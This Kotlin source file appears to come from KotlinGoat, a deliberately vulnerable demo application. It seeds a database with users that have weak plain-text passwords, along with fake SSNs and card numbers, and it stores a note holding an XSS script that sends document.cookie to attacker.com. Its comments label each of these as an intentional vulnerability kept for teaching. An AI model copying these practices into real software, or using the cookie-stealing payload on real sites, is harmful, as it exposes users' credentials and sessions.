package com.kotlingoat.config

import com.kotlingoat.models.*
import jakarta.annotation.PostConstruct
import jakarta.persistence.EntityManager
import jakarta.persistence.PersistenceContext
import jakarta.transaction.Transactional
import org.springframework.stereotype.Component

/**
 * Seeds the database with sample users, notes, orders, and products
 * for vulnerability demonstrations.
 *
 * VULNERABILITY: Admin and test accounts with weak/known passwords pre-seeded.
 */
@Component
class DataInitializer {

    @PersistenceContext
    lateinit var em: EntityManager

    @PostConstruct
    @Transactional
    fun init() {
        // VULNERABILITY: Seeded with plain-text passwords and sensitive PII
        val admin = User(
            username = "admin",
            password = "Admin@KotlinGoat2024!",  // Plain text
            email = "admin@kotlingoat.com",
            role = "admin",
            tenantId = 1,
            creditBalance = 10000.0,
            ssn = "123-45-6789",
            creditCardNumber = "4111111111111111",
            cvv = "123"
        )

        val alice = User(
            username = "alice",
            password = "password123",           // Weak plain-text password
            email = "alice@example.com",
            role = "user",
            tenantId = 1,
            creditBalance = 500.0,
            ssn = "987-65-4321",
            creditCardNumber = "5500005555555559",
            cvv = "456"
        )

        val bob = User(
            username = "bob",
            password = "bob123",                // Even weaker password
            email = "bob@example.com",
            role = "user",
            tenantId = 2,                       // Different tenant
            creditBalance = 250.0,
            ssn = "111-22-3333",
            creditCardNumber = "340000000000009",
            cvv = "789"
        )

        em.persist(admin)
        em.persist(alice)
        em.persist(bob)
        em.flush()

        // Seed notes
        val aliceNote = Note(
            ownerId = alice.id,
            tenantId = 1,
            title = "Alice's Secret",
            content = "My bank account PIN is 4821",  // Sensitive content
            isPrivate = true
        )

        val bobNote = Note(
            ownerId = bob.id,
            tenantId = 2,
            title = "Bob's Private Note",
            content = "Business plan: merger with CompetitorCorp in Q3",
            isPrivate = true
        )

        // VULNERABILITY: XSS payload stored as a note (demonstrates stored XSS)
        val xssNote = Note(
            ownerId = alice.id,
            tenantId = 1,
            title = "XSS Demo",
            content = "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
            isPrivate = false
        )

        em.persist(aliceNote)
        em.persist(bobNote)
        em.persist(xssNote)
        em.flush()

        // Seed products
        val product1 = Product(name = "Premium Subscription", price = 99.99, stock = 100)
        val product2 = Product(name = "Basic Plan", price = 9.99, stock = 500)
        val product3 = Product(name = "Enterprise License", price = 999.99, stock = 10)

        em.persist(product1)
        em.persist(product2)
        em.persist(product3)
        em.flush()

        // Seed orders
        val order1 = Order(
            userId = alice.id,
            productId = product1.id,
            quantity = 1,
            price = 99.99,
            status = "pending"
        )
        em.persist(order1)
        em.flush()
    }
}
